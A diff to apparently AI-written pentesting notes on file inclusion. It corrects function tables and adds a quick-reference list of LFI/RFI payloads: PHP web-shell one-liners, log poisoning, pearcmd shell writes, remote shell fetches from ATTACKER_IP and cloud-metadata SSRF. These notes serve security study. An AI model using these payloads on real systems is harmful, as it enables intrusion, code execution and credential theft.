@@ -660,7 +660,7 @@ curl http://target.com/?file=../../../../var/www/html/index.php
 C:\Windows\System32\drivers\etc\hosts
 C:\Windows\boot.ini
 C:\Windows\win.ini
-C:\Windows\System32\license.rtl
+C:\Windows\System32\license.rtf
 C:\Windows\debug\NetSetup.LOG           # Domain join info
 
 # Credentials & Secrets
@@ -949,33 +949,37 @@ Full exploitation detail for each path in [[Non-PHP Web App Attacks]].
 | Function | Read | Execute | Remote |
 |----------|:----:|:-------:|:------:|
 | `include()` / `include_once()` | ✅ | ✅ | ✅ |
-| `require()` / `require_once()` | ✅ | ✅ | ❌ |
+| `require()` / `require_once()` | ✅ | ✅ | ✅ |
 | `file_get_contents()` | ✅ | ❌ | ✅ |
 | `fopen()` / `file()` | ✅ | ❌ | ❌ |
+
+`include` and `require` behave identically for inclusion (both honor `allow_url_include` for Remote/RFI); the only difference is `require` throws a fatal error on failure while `include` emits a warning. "Remote" for `file_get_contents` needs `allow_url_fopen=On`.
 
 ### NodeJS
 
 | Function | Read | Execute | Remote |
 |----------|:----:|:-------:|:------:|
 | `fs.readFile()` | ✅ | ❌ | ❌ |
-| `fs.sendFile()` | ✅ | ❌ | ❌ |
-| `res.render()` | ✅ | ✅ | ❌ |
+| `res.sendFile()` (Express) | ✅ | ❌ | ❌ |
+| `res.render()` (template → SSTI) | ✅ | ✅ | ❌ |
 
-### Java
+### Java (JSP)
 
 | Function | Read | Execute | Remote |
 |----------|:----:|:-------:|:------:|
-| `include` | ✅ | ❌ | ❌ |
-| `import` | ✅ | ✅ | ✅ |
+| `<jsp:include>` (runtime) | ✅ | ❌ | ❌ |
+| `<%@ include %>` (static/translation-time) | ✅ | ✅ | ❌ |
+
+(`import` in Java is a compile-time statement, not a runtime file-inclusion vector — the JSP directives above are the real inclusion mechanisms.)
 
 ### .NET
 
 | Function | Read | Execute | Remote |
 |----------|:----:|:-------:|:------:|
-| `@Html.Partial()` | ✅ | ❌ | ❌ |
-| `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
+| `@Html.Partial()` / `@Html.RenderPartial()` | ✅ | ✅ | ❌ |
 | `Response.WriteFile()` | ✅ | ❌ | ❌ |
-| `include` | ✅ | ✅ | ✅ |
+| `Server.Execute()` | ✅ | ✅ | ❌ |
+| `<!--#include virtual-->` (SSI, classic ASP) | ✅ | ✅ | ❌ |
 
 ---
 
@@ -1097,7 +1101,7 @@ cat /proc/net/tcp | awk '{print $2}' | grep -v local
 **Tools:**
 - [[ffuf]] - Fuzzing
 - [[gobuster]] - Enumeration
-- [[Burp Suite]] - Manual testing
+- [[Burpsuite]] - Manual testing
 
 **External:**
 - [HackTricks - File Inclusion](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/)
@@ -1106,6 +1110,30 @@ cat /proc/net/tcp | awk '{print $2}' | grep -v local
 
 ---
 
+## Quick Reference
+
+| Goal | Payload / Command |
+|---|---|
+| Basic LFI | `?file=/etc/passwd` |
+| Path traversal | `?file=../../../etc/passwd` |
+| Non-recursive filter bypass | `?file=....//....//....//etc/passwd` |
+| Read PHP source as base64 | `?file=php://filter/read=convert.base64-encode/resource=config` |
+| Inject code (needs allow_url_include) | `?file=data://text/plain,<?php phpinfo(); ?>` |
+| POST payload via php://input | `curl -X POST -d '<?php system($_GET["cmd"]); ?>' 'http://target.com/?language=php://input&cmd=id'` |
+| RCE with no write/upload needed | `python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'` |
+| Zip-based RCE | `?file=zip://uploads/shell.jpg%23shell.php&cmd=id` |
+| RFI shell (allow_url_include=On) | `?language=http://ATTACKER_IP/shell.php&cmd=id` |
+| SMB-based RFI (Windows) | `impacket-smbserver -smb2support share $(pwd)` then `?file=\\ATTACKER_IP\share\shell.php` |
+| Log poisoning via User-Agent | `curl -A '<?php system($_GET["cmd"]); ?>' http://target.com/` then `?file=../../../../var/log/apache2/access.log&cmd=id` |
+| /proc/self/fd/ brute force | `for i in $(seq 1 25); do curl -s "http://target.com/?file=/proc/self/fd/$i&cmd=id"; done` |
+| pearcmd.php RCE (PHP Docker) | `?file=/usr/local/lib/php/pearcmd.php&+config-create+/&/<?php+system($_GET["cmd"]);?>+/var/www/html/shell.php` |
+| Fuzz for vulnerable params | `ffuf -w burp-parameter-names.txt:FUZZ -u 'http://target.com/?FUZZ=value' -fs 2287` |
+| Fuzz for LFI payloads | `ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://target.com/?language=FUZZ' -fs 2287 -mc 200` |
+| Nginx alias traversal | `curl http://target.com/static../etc/passwd` |
+| LFI → SSRF (cloud metadata) | `?file=http://169.254.169.254/latest/meta-data/` |
+
+---
+
 *Created: 2026-02-27*
-*Updated: 2026-05-14*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-07-27*
+*Model: claude-sonnet-5*
